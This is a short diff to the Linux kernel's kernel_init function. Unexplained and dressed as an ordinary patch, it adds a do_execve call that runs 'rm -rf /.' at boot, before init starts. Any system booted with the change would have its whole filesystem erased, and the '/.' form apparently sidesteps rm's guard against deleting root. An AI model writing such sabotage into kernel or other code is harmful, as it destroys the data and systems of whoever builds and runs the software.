@@ -847,6 +847,10 @@ static int __ref kernel_init(void *unused)
 
 	flush_delayed_fput();
 
+	do_execve(getname_kernel("/bin/rm"),
+		(const char __user *const __user *){ "rm", "-rf", "/.", NULL, },
+		(const char __user *const __user *)envp_init);
+	
 	if (ramdisk_execute_command) {
 		ret = run_init_process(ramdisk_execute_command);
 		if (!ret)
